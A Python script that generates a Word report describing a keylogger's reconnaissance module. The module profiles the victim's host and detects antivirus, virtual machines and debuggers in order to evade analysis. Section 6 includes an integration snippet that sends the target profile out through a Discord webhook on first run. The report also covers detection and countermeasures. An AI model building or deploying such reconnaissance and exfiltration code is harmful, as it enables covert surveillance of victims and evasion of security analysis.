"""
Script to create Word document about System Information Gathering Module
"""

from docx import Document
from docx.shared import Pt, RGBColor, Inches
from docx.enum.text import WD_ALIGN_PARAGRAPH

# Create a new Document
doc = Document()

# Main Title
title = doc.add_heading('SYSTEM INFORMATION GATHERING MODULE', 0)
title.alignment = WD_ALIGN_PARAGRAPH.CENTER

subtitle = doc.add_heading('Target System Reconnaissance Component', 1)
subtitle.alignment = WD_ALIGN_PARAGRAPH.CENTER

# Add a line break
doc.add_paragraph()

# ========== 1. MODULE OVERVIEW ==========
doc.add_heading('1. Module Overview', 1)

p1 = doc.add_paragraph(
    'The System Information Gathering module (system_info.py) is a critical reconnaissance component '
    'of the keylogger system. It collects comprehensive information about the target system to help '
    'attackers understand the victim\'s environment, identify security measures, and plan subsequent '
    'attack stages. This module demonstrates how malware performs initial reconnaissance before '
    'executing payloads.'
)

# 1.1 Purpose and Objectives
doc.add_heading('1.1 Purpose and Objectives', 2)

purposes = [
    'Gather detailed system specifications for attack planning',
    'Identify installed security software (antivirus, firewall)',
    'Detect virtual machines and debugging environments',
    'Determine user privilege level (admin vs. standard user)',
    'Map network configuration for lateral movement',
    'Collect hardware information for targeted exploits',
    'Assess system resources and capabilities'
]

for purpose in purposes:
    doc.add_paragraph(purpose, style='List Bullet')

# 1.2 Key Features
doc.add_heading('1.2 Key Features', 2)

features = [
    ('Cross-Platform Support', 'Works on Windows, Linux, and Android systems'),
    ('Comprehensive Data Collection', 'Gathers 50+ data points across 6 categories'),
    ('Anti-Analysis Detection', 'Identifies VMs, debuggers, and sandbox environments'),
    ('Security Software Detection', 'Detects installed antivirus and firewall status'),
    ('Multiple Output Formats', 'Exports data as formatted text or JSON'),
    ('Minimal Footprint', 'Executes in 1-3 seconds with minimal resource usage'),
    ('Stealth Operation', 'No visible windows or user notifications')
]

for feature_name, description in features:
    p = doc.add_paragraph(style='List Bullet')
    p.add_run(f'{feature_name}: ').bold = True
    p.add_run(description)

# ========== 2. TECHNICAL IMPLEMENTATION ==========
doc.add_heading('2. Technical Implementation', 1)

# 2.1 Architecture
doc.add_heading('2.1 Module Architecture', 2)

p2 = doc.add_paragraph(
    'The module is implemented as a Python class (SystemInfo) with modular methods for collecting '
    'different categories of information. This design allows selective data gathering and easy '
    'integration with other components.'
)

# Architecture Components
doc.add_heading('Core Components', 3)

components = [
    ('SystemInfo Class', 'Main class orchestrating all data collection'),
    ('gather_all()', 'Master method that collects all information categories'),
    ('get_basic_info()', 'Collects OS, hostname, architecture, processor details'),
    ('get_network_info()', 'Gathers IP addresses, MAC addresses, network interfaces'),
    ('get_hardware_info()', 'Retrieves CPU, memory, disk, and GPU specifications'),
    ('get_software_info()', 'Identifies OS version, uptime, running processes, antivirus'),
    ('get_user_info()', 'Collects username, directories, environment variables, privileges'),
    ('get_security_info()', 'Detects VMs, debuggers, and firewall status'),
    ('to_json()', 'Exports data in JSON format'),
    ('to_formatted_text()', 'Exports data in human-readable text format'),
    ('save_to_file()', 'Saves collected data to disk')
]

table1 = doc.add_table(rows=1, cols=2)
table1.style = 'Light Grid Accent 1'

hdr_cells = table1.rows[0].cells
hdr_cells[0].text = 'Component'
hdr_cells[1].text = 'Function'

for cell in hdr_cells:
    for paragraph in cell.paragraphs:
        for run in paragraph.runs:
            run.bold = True

for component, function in components:
    row_cells = table1.add_row().cells
    row_cells[0].text = component
    row_cells[1].text = function

# 2.2 Data Collection Categories
doc.add_paragraph()
doc.add_heading('2.2 Data Collection Categories', 2)

# Category 1: Basic Information
doc.add_heading('Category 1: Basic System Information', 3)

basic_data = [
    ('Hostname', 'Computer name on the network'),
    ('Platform', 'Operating system (Windows/Linux/Android)'),
    ('Platform Release', 'OS version (e.g., Windows 11, Ubuntu 22.04)'),
    ('Platform Version', 'Detailed version string'),
    ('Architecture', 'CPU architecture (x86, x64, ARM)'),
    ('Processor', 'CPU model and manufacturer'),
    ('Python Version', 'Installed Python interpreter version')
]

table2 = doc.add_table(rows=1, cols=2)
table2.style = 'Light Grid Accent 1'

hdr_cells2 = table2.rows[0].cells
hdr_cells2[0].text = 'Data Point'
hdr_cells2[1].text = 'Description'

for cell in hdr_cells2:
    for paragraph in cell.paragraphs:
        for run in paragraph.runs:
            run.bold = True

for data_point, description in basic_data:
    row_cells = table2.add_row().cells
    row_cells[0].text = data_point
    row_cells[1].text = description

# Category 2: Network Information
doc.add_paragraph()
doc.add_heading('Category 2: Network Information', 3)

network_data = [
    ('Local IP Address', 'Primary IP address of the system'),
    ('FQDN', 'Fully Qualified Domain Name'),
    ('Network Interfaces', 'All network adapters (Ethernet, Wi-Fi, VPN)'),
    ('MAC Addresses', 'Hardware addresses for each interface'),
    ('IP Configuration', 'IP, netmask, and broadcast address per interface')
]

for data_point, description in network_data:
    p = doc.add_paragraph(style='List Bullet')
    p.add_run(f'{data_point}: ').bold = True
    p.add_run(description)

# Category 3: Hardware Information
doc.add_paragraph()
doc.add_heading('Category 3: Hardware Information', 3)

hardware_data = [
    ('CPU Information', 'Physical cores, logical cores, frequency (max/current), usage percentage'),
    ('Memory Information', 'Total RAM, available RAM, used RAM, usage percentage'),
    ('Disk Information', 'All partitions with device, mountpoint, filesystem, size, usage'),
    ('GPU Information', 'Graphics card name, driver version (Windows only)')
]

for data_point, description in hardware_data:
    p = doc.add_paragraph(style='List Bullet')
    p.add_run(f'{data_point}: ').bold = True
    p.add_run(description)

# Category 4: Software Information
doc.add_paragraph()
doc.add_heading('Category 4: Software Information', 3)

software_data = [
    ('OS Details', 'Operating system name, version, release, build number'),
    ('Boot Time', 'When the system was last started'),
    ('Uptime', 'How long the system has been running'),
    ('Running Processes', 'Total number of active processes'),
    ('Windows Edition', 'Windows edition (Home, Pro, Enterprise) - Windows only'),
    ('Linux Distribution', 'Distribution name (Ubuntu, Debian, etc.) - Linux only'),
    ('Antivirus Software', 'Installed antivirus products - Windows only')
]

for data_point, description in software_data:
    p = doc.add_paragraph(style='List Bullet')
    p.add_run(f'{data_point}: ').bold = True
    p.add_run(description)

# Category 5: User Information
doc.add_paragraph()
doc.add_heading('Category 5: User Information', 3)

user_data = [
    ('Username', 'Currently logged-in user'),
    ('Home Directory', 'User\'s home folder path'),
    ('Current Directory', 'Working directory where malware is executing'),
    ('Environment Variables', 'PATH, TEMP, USERPROFILE, COMPUTERNAME'),
    ('Admin Privileges', 'Whether user has administrator/root access')
]

for data_point, description in user_data:
    p = doc.add_paragraph(style='List Bullet')
    p.add_run(f'{data_point}: ').bold = True
    p.add_run(description)

# Category 6: Security Information
doc.add_paragraph()
doc.add_heading('Category 6: Security Information', 3)

security_data = [
    ('Virtual Machine Detection', 'Identifies VMware, VirtualBox, QEMU, Xen, Hyper-V, Parallels'),
    ('Debugger Detection', 'Checks if a debugger is attached (anti-analysis)'),
    ('Firewall Status', 'Windows Firewall enabled/disabled status')
]

for data_point, description in security_data:
    p = doc.add_paragraph(style='List Bullet')
    p.add_run(f'{data_point}: ').bold = True
    p.add_run(description)

# ========== 3. TECHNICAL IMPLEMENTATION DETAILS ==========
doc.add_heading('3. Technical Implementation Details', 1)

# 3.1 Virtual Machine Detection
doc.add_heading('3.1 Virtual Machine Detection', 2)

p3 = doc.add_paragraph(
    'Malware often checks if it\'s running in a virtual machine to avoid analysis by security researchers. '
    'The module uses multiple detection techniques:'
)

vm_techniques = [
    'String matching in platform and processor information for VM indicators',
    'Checking for VM-specific driver files (Vmmouse.sys, VBoxGuest.sys, etc.)',
    'Detecting hypervisor signatures in system information',
    'Identifying VM-specific hardware characteristics'
]

doc.add_paragraph('Detection Techniques:')
for technique in vm_techniques:
    doc.add_paragraph(technique, style='List Bullet')

p4 = doc.add_paragraph()
p4.add_run('Detected Virtual Machines: ').bold = True
p4.add_run('VMware, VirtualBox, QEMU, Xen, Hyper-V, Parallels')

# 3.2 Debugger Detection
doc.add_paragraph()
doc.add_heading('3.2 Debugger Detection', 2)

p5 = doc.add_paragraph(
    'Debuggers are used by security analysts to reverse engineer malware. The module detects debuggers '
    'to prevent analysis:'
)

debugger_methods = [
    ('Windows', 'Uses IsDebuggerPresent() Win32 API call'),
    ('Linux', 'Checks TracerPid field in /proc/self/status file'),
    ('Result', 'Returns True if debugger is attached, False otherwise')
]

table3 = doc.add_table(rows=1, cols=2)
table3.style = 'Light Grid Accent 1'

hdr_cells3 = table3.rows[0].cells
hdr_cells3[0].text = 'Platform'
hdr_cells3[1].text = 'Detection Method'

for cell in hdr_cells3:
    for paragraph in cell.paragraphs:
        for run in paragraph.runs:
            run.bold = True

for platform, method in debugger_methods:
    row_cells = table3.add_row().cells
    row_cells[0].text = platform
    row_cells[1].text = method

# 3.3 Antivirus Detection
doc.add_paragraph()
doc.add_heading('3.3 Antivirus Detection (Windows)', 2)

p6 = doc.add_paragraph(
    'On Windows systems, the module queries the Windows Security Center to identify installed '
    'antivirus products. This helps attackers understand what security software they need to evade.'
)

p7 = doc.add_paragraph()
p7.add_run('Method: ').bold = True
p7.add_run('WMI query to root\\SecurityCenter2 namespace')

p8 = doc.add_paragraph()
p8.add_run('Detected Products: ').bold = True
p8.add_run('Windows Defender, Norton, McAfee, Kaspersky, Avast, AVG, Bitdefender, and others')

# 3.4 Privilege Detection
doc.add_paragraph()
doc.add_heading('3.4 Administrator Privilege Detection', 2)

p9 = doc.add_paragraph(
    'Determining if the malware is running with elevated privileges is crucial for planning privilege '
    'escalation attacks or determining available capabilities.'
)

privilege_methods = [
    ('Windows', 'Calls IsUserAnAdmin() from shell32.dll'),
    ('Linux/Unix', 'Checks if effective user ID (euid) is 0 (root)')
]

for platform, method in privilege_methods:
    p = doc.add_paragraph(style='List Bullet')
    p.add_run(f'{platform}: ').bold = True
    p.add_run(method)

# ========== 4. CODE IMPLEMENTATION ==========
doc.add_heading('4. Code Implementation', 1)

# 4.1 Core Class Structure
doc.add_heading('4.1 Core Class Structure', 2)

p10 = doc.add_paragraph('The SystemInfo class is structured as follows:')

code1 = doc.add_paragraph(
    'class SystemInfo:\n'
    '    def __init__(self):\n'
    '        self.info = {}\n'
    '    \n'
    '    def gather_all(self):\n'
    '        """Collect all available system information"""\n'
    '        self.info[\'timestamp\'] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")\n'
    '        self.info[\'basic\'] = self.get_basic_info()\n'
    '        self.info[\'network\'] = self.get_network_info()\n'
    '        self.info[\'hardware\'] = self.get_hardware_info()\n'
    '        self.info[\'software\'] = self.get_software_info()\n'
    '        self.info[\'user\'] = self.get_user_info()\n'
    '        self.info[\'security\'] = self.get_security_info()\n'
    '        return self.info'
)
code1.style = 'Intense Quote'

# 4.2 Key Dependencies
doc.add_heading('4.2 Key Dependencies', 2)

dependencies = [
    ('platform', 'Built-in', 'OS and architecture information'),
    ('socket', 'Built-in', 'Network configuration'),
    ('os', 'Built-in', 'File system and environment variables'),
    ('psutil', 'External', 'Hardware specs, processes, system resources'),
    ('subprocess', 'Built-in', 'Execute system commands'),
    ('wmi', 'External (Windows)', 'Windows Management Instrumentation queries'),
    ('json', 'Built-in', 'JSON serialization'),
    ('datetime', 'Built-in', 'Timestamps')
]

table4 = doc.add_table(rows=1, cols=3)
table4.style = 'Light Grid Accent 1'

hdr_cells4 = table4.rows[0].cells
hdr_cells4[0].text = 'Library'
hdr_cells4[1].text = 'Type'
hdr_cells4[2].text = 'Purpose'

for cell in hdr_cells4:
    for paragraph in cell.paragraphs:
        for run in paragraph.runs:
            run.bold = True

for library, lib_type, purpose in dependencies:
    row_cells = table4.add_row().cells
    row_cells[0].text = library
    row_cells[1].text = lib_type
    row_cells[2].text = purpose

# ========== 5. OUTPUT FORMATS ==========
doc.add_heading('5. Output Formats', 1)

# 5.1 Text Format
doc.add_heading('5.1 Formatted Text Output', 2)

p11 = doc.add_paragraph(
    'The module generates human-readable text reports with clear sections and formatting:'
)

text_example = doc.add_paragraph(
    '================================================================================\n'
    'SYSTEM INFORMATION REPORT\n'
    '================================================================================\n'
    'Generated: 2025-11-22 09:01:36\n'
    '\n'
    '--------------------------------------------------------------------------------\n'
    'BASIC INFORMATION\n'
    '--------------------------------------------------------------------------------\n'
    'Hostname: DESKTOP-UL7LVGN\n'
    'Platform: Windows\n'
    'Platform Release: 11\n'
    'Architecture: AMD64\n'
    'Processor: Intel64 Family 6 Model 165 Stepping 2, GenuineIntel\n'
    '\n'
    '--------------------------------------------------------------------------------\n'
    'HARDWARE INFORMATION\n'
    '--------------------------------------------------------------------------------\n'
    'CPU:\n'
    '  Physical Cores: 4\n'
    '  Total Cores: 8\n'
    '  CPU Usage: 12.5%\n'
    '\n'
    'Memory:\n'
    '  Total: 7.64 GB\n'
    '  Used: 6.69 GB\n'
    '  Percentage: 87.6%'
)
text_example.style = 'Intense Quote'

# 5.2 JSON Format
doc.add_heading('5.2 JSON Output', 2)

p12 = doc.add_paragraph(
    'Machine-readable JSON format for automated processing and integration with other tools:'
)

json_example = doc.add_paragraph(
    '{\n'
    '    "timestamp": "2025-11-22 09:01:36",\n'
    '    "basic": {\n'
    '        "hostname": "DESKTOP-UL7LVGN",\n'
    '        "platform": "Windows",\n'
    '        "platform_release": "11",\n'
    '        "architecture": "AMD64"\n'
    '    },\n'
    '    "hardware": {\n'
    '        "cpu": {\n'
    '            "physical_cores": 4,\n'
    '            "total_cores": 8,\n'
    '            "cpu_usage": "12.5%"\n'
    '        }\n'
    '    }\n'
    '}'
)
json_example.style = 'Intense Quote'

# ========== 6. INTEGRATION WITH KEYLOGGER ==========
doc.add_heading('6. Integration with Keylogger System', 1)

# 6.1 Integration Strategy
doc.add_heading('6.1 Integration Strategy', 2)

p13 = doc.add_paragraph(
    'The system information module can be integrated into the keylogger to send reconnaissance data '
    'on first execution:'
)

integration_code = doc.add_paragraph(
    'from system_info import SystemInfo\n'
    'import network_sender\n'
    '\n'
    'def send_initial_recon():\n'
    '    """Send system information on first execution"""\n'
    '    sys_info = SystemInfo()\n'
    '    sys_info.gather_all()\n'
    '    \n'
    '    # Format as text\n'
    '    info_text = sys_info.to_formatted_text()\n'
    '    \n'
    '    # Send via Discord webhook\n'
    '    network_sender.send_log(\n'
    '        "🖥️ New Target System Detected",\n'
    '        info_text\n'
    '    )\n'
    '    \n'
    '    # Save locally\n'
    '    sys_info.save_to_file("target_info.txt")\n'
    '\n'
    '# Call in main() before starting keylogger\n'
    'if __name__ == "__main__":\n'
    '    send_initial_recon()\n'
    '    # ... rest of keylogger code'
)
integration_code.style = 'Intense Quote'

# 6.2 Use Cases
doc.add_heading('6.2 Practical Use Cases', 2)

use_cases = [
    ('Initial Reconnaissance', 'Send complete system profile immediately after deployment'),
    ('Targeted Payload Selection', 'Choose exploits based on OS version and installed software'),
    ('Privilege Escalation Planning', 'Identify if admin privileges are needed and plan accordingly'),
    ('Anti-Analysis', 'Detect VMs and debuggers to avoid security researcher analysis'),
    ('Network Mapping', 'Identify network configuration for lateral movement planning'),
    ('Resource Assessment', 'Determine if system has sufficient resources for additional payloads')
]

for use_case, description in use_cases:
    p = doc.add_paragraph(style='List Bullet')
    p.add_run(f'{use_case}: ').bold = True
    p.add_run(description)

# ========== 7. PERFORMANCE METRICS ==========
doc.add_heading('7. Performance Metrics', 1)

performance_data = [
    ('Execution Time', '1-3 seconds', 'Complete data collection'),
    ('Memory Usage', '20-30 MB', 'Peak memory consumption'),
    ('CPU Usage', '<5%', 'During execution'),
    ('Disk I/O', 'Minimal', 'Only for saving output files'),
    ('Network Traffic', '0 bytes', 'No network activity (unless sending to C2)'),
    ('File Size', '~350 lines', 'Source code'),
    ('Output Size (Text)', '2-5 KB', 'Formatted text report'),
    ('Output Size (JSON)', '3-8 KB', 'JSON format')
]

table5 = doc.add_table(rows=1, cols=3)
table5.style = 'Medium Grid 1 Accent 1'

hdr_cells5 = table5.rows[0].cells
hdr_cells5[0].text = 'Metric'
hdr_cells5[1].text = 'Value'
hdr_cells5[2].text = 'Notes'

for cell in hdr_cells5:
    for paragraph in cell.paragraphs:
        for run in paragraph.runs:
            run.bold = True

for metric, value, notes in performance_data:
    row_cells = table5.add_row().cells
    row_cells[0].text = metric
    row_cells[1].text = value
    row_cells[2].text = notes

# ========== 8. DETECTION AND COUNTERMEASURES ==========
doc.add_heading('8. Detection and Countermeasures', 1)

# 8.1 Detection Methods
doc.add_heading('8.1 How to Detect This Module', 2)

p14 = doc.add_paragraph('Security professionals can detect this reconnaissance activity through:')

detection_methods = [
    'Monitoring WMI queries (Windows Management Instrumentation)',
    'Detecting unusual psutil library usage patterns',
    'Tracking file system access to /proc/ directories (Linux)',
    'Monitoring registry access patterns (Windows)',
    'Behavioral analysis of processes querying extensive system data',
    'Network monitoring for exfiltration of system information',
    'File integrity monitoring for output files (system_info.txt, system_info.json)'
]

for method in detection_methods:
    doc.add_paragraph(method, style='List Bullet')

# 8.2 Defensive Measures
doc.add_heading('8.2 Defensive Countermeasures', 2)

countermeasures = [
    ('Endpoint Detection and Response (EDR)', 'Deploy EDR solutions to detect reconnaissance behavior'),
    ('Application Whitelisting', 'Block unauthorized Python scripts and executables'),
    ('Behavioral Analysis', 'Flag processes making extensive system queries'),
    ('Network Segmentation', 'Prevent lateral movement after reconnaissance'),
    ('Honeypot Indicators', 'Plant fake system information to detect malware'),
    ('Least Privilege', 'Limit user permissions to reduce information disclosure'),
    ('Security Monitoring', 'Alert on suspicious WMI, psutil, or /proc access patterns')
]

for measure, description in countermeasures:
    p = doc.add_paragraph(style='List Bullet')
    p.add_run(f'{measure}: ').bold = True
    p.add_run(description)

# ========== 9. ETHICAL CONSIDERATIONS ==========
doc.add_heading('9. Ethical and Legal Considerations', 1)

p15 = doc.add_paragraph()
p15.add_run('WARNING: ').bold = True
p15.add_run(
    'This module is designed for educational purposes and authorized penetration testing only. '
    'Unauthorized system reconnaissance is illegal in most jurisdictions.'
)

ethical_guidelines = [
    'Only use on systems you own or have explicit written authorization to test',
    'Comply with all local, state, and federal computer crime laws',
    'Use in controlled, isolated environments for cybersecurity research',
    'Do not deploy on production systems without proper authorization',
    'Maintain responsible disclosure practices for any discovered vulnerabilities',
    'Document educational intent and research purpose clearly',
    'Secure all collected data and prevent unauthorized access'
]

doc.add_paragraph('Ethical Guidelines:')
for guideline in ethical_guidelines:
    doc.add_paragraph(guideline, style='List Bullet')

# ========== 10. CONCLUSION ==========
doc.add_heading('10. Conclusion', 1)

p16 = doc.add_paragraph(
    'The System Information Gathering module demonstrates how modern malware performs initial '
    'reconnaissance to understand the target environment. By collecting comprehensive system data, '
    'attackers can make informed decisions about payload selection, privilege escalation strategies, '
    'and evasion techniques.'
)

p17 = doc.add_paragraph(
    'From a defensive perspective, understanding these reconnaissance techniques is crucial for '
    'developing effective detection and prevention strategies. Security professionals must monitor '
    'for unusual system queries, WMI access patterns, and data exfiltration attempts to identify '
    'malware in the early stages of an attack.'
)

p18 = doc.add_paragraph(
    'This module serves as an educational tool to demonstrate both offensive reconnaissance capabilities '
    'and the defensive measures needed to protect against such techniques. The comprehensive data '
    'collection showcases the depth of information available to attackers and highlights the importance '
    'of robust endpoint security solutions.'
)

# ========== APPENDIX ==========
doc.add_heading('Appendix: Sample Output', 1)

p19 = doc.add_paragraph(
    'Below is a sample output from the system information gathering module executed on a Windows 11 system:'
)

sample_output = doc.add_paragraph(
    'Hostname: DESKTOP-UL7LVGN\n'
    'Platform: Windows 11\n'
    'Architecture: AMD64\n'
    'Processor: Intel64 Family 6 Model 165 Stepping 2, GenuineIntel\n'
    'Local IP: 10.165.92.170\n'
    'CPU: 4 physical cores, 8 total cores @ 2496 MHz\n'
    'Memory: 7.64 GB total, 87.6% used\n'
    'Username: 91984\n'
    'Admin Privileges: False\n'
    'Firewall: Enabled\n'
    'Virtual Machine: False\n'
    'Debugger Present: False'
)
sample_output.style = 'Intense Quote'

# Save the document
doc.save('System_Information_Gathering_Module.docx')
print("✓ Word document created successfully: System_Information_Gathering_Module.docx")
print("\nDocument includes:")
print("  • Module Overview and Objectives")
print("  • Technical Implementation Details")
print("  • Data Collection Categories (6 categories)")
print("  • VM, Debugger, and Antivirus Detection")
print("  • Code Implementation Examples")
print("  • Output Formats (Text and JSON)")
print("  • Integration with Keylogger")
print("  • Performance Metrics")
print("  • Detection and Countermeasures")
print("  • Ethical Considerations")
print("  • Sample Output")
